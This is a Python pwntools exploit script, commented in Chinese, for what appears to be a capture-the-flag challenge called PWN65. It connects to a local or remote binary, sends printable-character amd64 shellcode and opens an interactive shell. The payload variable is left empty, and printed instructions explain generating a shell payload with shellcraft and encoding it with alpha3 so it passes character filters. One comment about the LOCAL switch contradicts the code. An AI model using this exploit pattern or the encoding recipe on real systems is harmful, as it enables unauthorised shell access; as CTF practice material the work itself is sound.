#!/usr/bin/env python3
"""
PWN65 - 可打印字符 shellcode 题目
使用预构建的可打印字符 shellcode
"""
from pwn import *

context(arch='amd64', os='linux')
context.log_level = 'info'

# ============ 配置 ============
LOCAL = True
# LOCAL = False  # 远程攻击时改为 True

if LOCAL:
    p = process('./pwn')
else:
    p = remote('ip', port)

# ============ 可打印字符 shellcode ============
# 这是一个预构建的 x64 可打印字符 shellcode
# 来源: alpha3 工具生成
# 全部字符在 0x30-0x7A 范围内

# 如果你有 alpha3 生成的结果，替换这里
# 这里使用一个示例占位
printable_sc = b""

# ============ 方法说明 ============
print("""
[*] 可打印字符 shellcode 生成方法：

方法1 - 使用 alpha3 (需要 Python2):
---------------------------------------
# 1. 生成原始 shellcode
python3 -c "from pwn import *; open('raw.bin','wb').write(asm(shellcraft.sh()))"

# 2. 使用 alpha3 编码
cd /home/kk/ti/工具/alpha3
python2 ALPHA3.py x64 ascii mixedcase rax --input=raw.bin > encoded.txt

# 3. 复制 encoded.txt 的内容到下面的 printable_sc 变量


方法2 - 在线工具:
---------------------------------------
访问: https://defuse.ca/online-x86-assembler.htm
或者: https://rayhanw.github.io/alpha3-online/


方法3 - 安装 Python2:
---------------------------------------
sudo apt install python2
""")

# ============ 如果没有编码后的 shellcode ============
if not printable_sc:
    print("[!] 请先使用上述方法生成可打印字符 shellcode")
    print("[!] 然后将编码结果复制到本脚本的 printable_sc 变量")
    p.close()
    exit(0)

# ============ 发送 payload ============
print(f"[+] 发送 shellcode，长度: {len(printable_sc)}")
p.sendafter(b'Input you Shellcode', printable_sc)

# ============ 获取 shell ============
print("[+] 等待 shell...")
p.interactive()
